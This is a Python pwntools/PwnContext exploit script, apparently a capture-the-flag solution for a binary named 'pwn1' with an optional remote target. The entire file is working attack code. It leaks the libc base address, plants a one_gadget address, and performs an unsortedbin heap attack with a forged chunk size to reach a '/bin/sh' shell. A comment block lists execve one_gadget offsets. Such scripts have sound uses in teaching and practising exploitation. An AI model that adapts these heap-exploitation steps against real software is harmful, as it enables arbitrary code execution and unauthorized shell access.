#-*- coding:utf-8 -*-
from PwnContext import *
context.terminal = ['tmux','splitw','-h']
s       = lambda data               :ctx.send(str(data))
sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
sl      = lambda data               :ctx.sendline(str(data)) 
sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
irt     = lambda                    :ctx.interactive()
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
leak_libc=lambda data=0   :uu64(ru('\x7f',drop=False)[-6:])-data

debugg = 1
logg = 0
ctx.binary = './pwn1'
ctx.breakpoints=[0x40121E]
ctx.symbols={'lst':0x605380}
if debugg:
    rs()
else:
    ctx.remote = ('0.0.0.0', 23339)
    rs('remote')
if logg:
    context.log_level='debug'
def lg(s,d):
    success(str(s)+' = '+hex(d))
def cmd(idx):
    sla('>>',idx)

def add(c):
    cmd(1)
    sla('num:',c)

def free():
    cmd(3)
    
def show():
    cmd(2)

#leak libc_base
for i in range(0x10):
    add(i)
show()
ru('1:')
libc_base = int(ru('\n'))-0x3c4b78
lg('libc_base',libc_base)
for i in range(34):
    sla('(y/n):','n')
free()#clear
one = 0x4526a+libc_base
lg('one',one)

#avoid consolidate 将top_chunk往下移
for i in range(0x21):
    add(str(one))
free()#clear

#unsortedbin attack
for i in range(0x10):
    add(str(0x21))
show()
sla('(y/n):','n')
sla('(y/n):','y')
sl(str(0x6051E8))
for i in range(15):
    sla('(y/n):','n')
sla('(y/n):','y')
sl(str(0x41))#change size to avoid unlink
for i in range(16):#rest
    sla('(y/n):','n')
free()#clear

#dbg()
for i in range(9):
    add(i)

irt()
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
  '''
